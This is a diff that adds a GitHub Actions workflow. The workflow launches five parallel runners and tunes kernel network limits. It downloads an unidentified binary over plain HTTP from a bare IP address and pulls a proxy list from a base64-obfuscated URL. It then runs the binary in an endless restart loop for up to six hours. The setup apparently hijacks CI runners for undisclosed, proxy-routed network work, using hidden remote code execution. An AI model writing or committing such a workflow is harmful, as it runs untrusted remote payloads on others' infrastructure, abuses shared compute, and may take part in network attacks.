@@ -1,0 +1,51 @@
+name: worker
+on:
+  workflow_dispatch:
+    inputs:
+      worker_id:
+        required: true
+        type: string
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      matrix:
+        instance: [1,2,3,4,5]
+      fail-fast: false
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - name: Tune system
+        run: |
+          ulimit -n 65535 || true
+          sysctl -w net.core.somaxconn=65535 2>/dev/null || true
+          sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null || true
+          sysctl -w net.core.rmem_max=134217728 2>/dev/null || true
+          sysctl -w net.core.wmem_max=134217728 2>/dev/null || true
+          sysctl -w net.ipv4.ip_local_port_range="1024 65535" 2>/dev/null || true
+      - name: Stagger start
+        run: sleep $(( (${{ matrix.instance }} - 1) * 60 ))
+      - name: Download worker binary
+        run: |
+          for i in 1 2 3 4 5; do
+            curl -fsSL --connect-timeout 15 --max-time 60 \
+              http://180.93.100.34:7980/download/worker -o worker && break
+            echo "retry $i..."; sleep 10
+          done
+          test -s worker || (echo "download failed" && exit 1)
+          chmod +x worker
+      - name: Fetch proxies
+        run: |
+          echo "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xvbmd2b25nbWF0Y2hhdC9EaXNjb3JkUmFua1N5bmMvcmVmcy9oZWFkcy9tYWluL3Byb3h5LnR4dA==" | base64 -d | xargs curl -sL -o proxy.txt || true
+      - name: Run
+        env:
+          WORKER_ID: ${{ github.run_id }}-${{ matrix.instance }}
+        run: |
+          while true; do
+            ./worker
+            EXIT_CODE=$?
+            echo "[workflow] worker exited code=$EXIT_CODE at $(date -u +%Y-%m-%dT%H:%M:%SZ), restarting in 5s..."
+            sleep 5
+          done
